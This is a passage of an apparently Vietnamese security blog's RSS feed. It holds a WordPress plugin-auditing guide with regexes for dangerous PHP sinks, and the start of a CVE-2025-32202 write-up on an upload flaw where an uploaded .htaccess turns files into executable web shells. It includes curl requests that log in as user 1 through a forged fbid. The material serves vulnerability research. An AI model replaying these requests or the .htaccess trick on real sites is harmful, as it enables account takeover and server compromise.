noreferrer&#34;&gt;&lt;code&gt;eval&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.call-user-func.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;call_user_func&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.call-user-func-array.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.create-function.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;create_function&lt;/code&gt;&lt;/a&gt; *(DEPRECATED từ PHP 7.2.0, REMOVED từ PHP 8.0.0)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(system|exec|shell_exec|passthru|proc_open|eval|call_user_func|call_user_func_array|create_function)\b&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;\$\w&amp;#43;\(&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;broken-access-control-rce&#34;&gt;&lt;span&gt;Broken Access Control (RCE)&lt;/span&gt;&#xA;  &lt;a href=&#34;#broken-access-control-rce&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#init-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;init&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#admin_init-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;admin_init&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#wp_ajax_action-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_ajax_&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/hooks/#wp_ajax_nopriv_action-hook&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_ajax_nopriv_&#39;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/wordpress-internals/functions/#register_rest_route-function&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;register_rest_route&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;(add_action|do_action)\s*\(\s*[&amp;#39;&amp;#34;]?(init|admin_init|wp_ajax_[\w-]&amp;#43;|wp_ajax_nopriv_[\w-]&amp;#43;)[&amp;#39;&amp;#34;]?|register_rest_route\s*\(|permission_callback|current_user_can|wp_verify_nonce|is_user_logged_in&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;privilege-escalation&#34;&gt;&lt;span&gt;Privilege Escalation&lt;/span&gt;&#xA;  &lt;a href=&#34;#privilege-escalation&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/update_option/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;update_option&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;users_can_register&lt;/code&gt;: Quyết định có cho phép người dùng tự đăng ký tài khoản hay không&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;default_role&lt;/code&gt;: Quyết định quyền mặc định của người dùng mới&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/update_user_meta/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;update_user_meta&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_users&lt;/code&gt;: chỉ chứa thông tin cơ bản (username, email, password…)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_usermeta&lt;/code&gt;: lưu mọi thông tin mở rộng của user&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_capabilities&lt;/code&gt;: Nó lưu vai trò (role) của user&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_insert_user/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_insert_user&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;role&lt;/code&gt;: quyết định quyền của user.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_update_user/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_update_user&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;role&lt;/code&gt;: quyết định quyền của user.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_set_password/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_set_password&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;&#39;wp_set_auth_cookie&#39;&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl &amp;lt;WORDPRESS_BASE_URL&amp;gt;/wp-admin/admin-ajax.php?action=configure_platform_callback -d &amp;#34;user_id=1&amp;amp;fbid=1337&amp;#34;&#xA;curl &amp;lt;WORDPRESS_BASE_URL&amp;gt;/wp-admin/admin-ajax.php?action=login_third_party?fb-login=1&amp;amp;fbid=1337&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_set_current_user/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_set_current_user&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;set_role&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;(update_option|update_user_meta|wp_insert_user|wp_update_user|wp_set_password|wp_set_auth_cookie|wp_set_current_user|set_role)\s*\(&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32202 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-12-cve-2025-32202/</link>
      <pubDate>Wed, 12 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-12-cve-2025-32202/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong Brian Batt - elearningfreak.com đối với plugin &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt; cho phép tải lên một &lt;strong&gt;Web Shell&lt;/strong&gt; lên máy chủ web. Vấn đề này ảnh hưởng đến &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt;: từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;4.3000000025&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32202&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32202&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3000000025&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3000000026&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Articulate Content into WordPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Embed Articulate Content into WordPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3000000025&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3000000026&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng nằm trong hàm &lt;code&gt;articulate_has_php_file()&lt;/code&gt; tại &lt;code&gt;/wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php&lt;/code&gt; do kiểm tra không đầy đủ, cho phép attacker tải lên file &lt;code&gt;.htaccess&lt;/code&gt; nhằm ghi đè cơ chế xử lý trong thư mục upload; kết quả là các file upload sau đó với phần mở rộng do attacker đặt (ví dụ &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xnxx&lt;/code&gt;) có thể thực thi như file PHP.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/add_check.png&#34; title=&#34;Thêm điều kiện kiểm tra .htaccess&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/add_check.png&#34; data-sub-html=&#34;&lt;h2&gt;Add .htaccess&lt;/h2&gt;&lt;p&gt;Thêm điều kiện kiểm tra .htaccess&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/add_check.png&#39; alt=&#34;Add .htaccess&#34; height=&#34;528&#34; width=&#34;1887&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thêm điều kiện kiểm tra .htaccess&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã thêm điều kiện check &lt;code&gt;.htaccess&lt;/code&gt; khi upload file giúp ngăn chặn lỗ hổng xảy ra.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một action hook dành cho người dùng đã đăng nhập&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_articulate_upload_file&amp;#39;, &amp;#39;articulate_upload_ajax_file&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức khi truy cập endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=articulate_upload_file&lt;/code&gt; thì callback &lt;code&gt;articulate_upload_ajax_file&lt;/code&gt; được gọi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function articulate_upload_ajax_file() {&#xA;&#x9;articulate_setup_php_ini();&#xA;&#x9;check_ajax_referer( &amp;#39;articulate_upload_file&amp;#39; );&#xA;&#xA;&#x9;if ( ! is_user_logged_in() || ! current_user_can( &amp;#39;upload_files&amp;#39; ) || ! current_user_can( &amp;#39;unfiltered_html&amp;#39; ) ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __( &amp;#39;You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$count_dirs = getDirs();&#xA;&#x9;// you can use WP&amp;#39;s wp_handle_upload() function:&#xA;&#x9;$file = $_FILES[&amp;#39;async-upload&amp;#39;];&#xA;&#x9;$dir  = untrailingslashit( getUploadsPath() );&#xA;&#xA;&#x9;if ( empty( $_FILES ) || $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;error&amp;#39;] ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to move uploaded file.  Please check if the folder has write permissions.&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#x9;$chunk    = isset( $_REQUEST[&amp;#39;chunk&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunk&amp;#39;] ) : 0;&#xA;&#x9;$chunks   = isset( $_REQUEST[&amp;#39;chunks&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunks&amp;#39;] ) : 0;&#xA;&#x9;$fileName = isset( $_REQUEST[&amp;#39;name&amp;#39;] ) ? sanitize_file_name( $_REQUEST[&amp;#39;name&amp;#39;] ) : sanitize_file_name( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;name&amp;#39;] );&#xA;&#x9;$filePath = &amp;#39;&amp;#39; . $dir . &amp;#39;/&amp;#39; . sanitize_file_name( $fileName ) . &amp;#39;&amp;#39;;&#xA;&#x9;// Open temp file&#xA;&#x9;$out = @fopen( &amp;#34;{$filePath}.part&amp;#34;, $chunk == 0 ? &amp;#39;wb&amp;#39; : &amp;#39;ab&amp;#39; );&#xA;&#x9;if ( $out ) {&#xA;&#x9;&#x9;// Read binary input stream and append it to temp file&#xA;&#x9;&#x9;$in = @fopen( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#39;rb&amp;#39; );&#xA;&#x9;&#x9;if ( $in ) {&#xA;&#x9;&#x9;&#x9;while ( $buff = fread( $in, 4096 ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;fwrite( $out, $buff );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to open input stream. Please check if the folder has write permissions&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;@fclose( $in );&#xA;&#x9;&#x9;@fclose( $out );&#xA;&#x9;&#x9;@unlink( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;] );&#xA;&#x9;} else {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to open output stream.  Please check if the folder has write permissions&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;// Security check.&#xA;&#x9;$mime  = wp_check_filetype( $filePath );&#xA;&#x9;$mimes = get_allowed_mime_types( get_current_user_id() );&#xA;&#x9;if ( ! isset( $mime[&amp;#39;type&amp;#39;] ) || ! in_array( $mime[&amp;#39;type&amp;#39;], array_values( $mimes ) ) ) {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 0,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from 